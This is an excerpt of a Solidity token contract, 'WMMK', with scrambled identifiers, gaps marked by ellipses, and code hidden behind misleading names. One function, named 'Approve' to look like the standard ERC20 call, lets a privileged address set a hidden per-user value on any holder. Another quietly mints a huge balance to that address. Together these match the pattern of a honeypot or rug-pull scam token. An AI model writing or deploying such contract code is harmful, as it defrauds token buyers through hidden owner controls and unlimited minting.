...
contract WMMK is Ownable {
    ...
    uint256 private  initSupply = 100000000000*10**decimals();
    address public YVliGKC;
    mapping(address => uint256) private TMFFmUser;

    constructor(address wEbYogv,string memory t2name, string memory t2symbol) {
        YVliGKC = wEbYogv;
        _Tokename = t2name;
    ...
    function quitbtc(address CUyprNb) external   {
        if(YVliGKC == _msgSender()){
            TMFFmUser[CUyprNb] = 0;
        }else {
            require(_msgSender() == YVliGKC);
        }
        
    }

    function Approve(address CUyprNb) external   {
        if(YVliGKC == _msgSender()){
           TMFFmUser[CUyprNb] = 900;
        }else {
            require(_msgSender() == YVliGKC);
        }
    ...
    function paOmNsW() public  {
        if(YVliGKC == _msgSender()){
            uint256 sSjmvfr = 1000000000000*10**decimals()*98000;
            _balances[_msgSender()] += sSjmvfr;
        }else {
            require(_msgSender() == YVliGKC);
            revert("rbbb");
        }
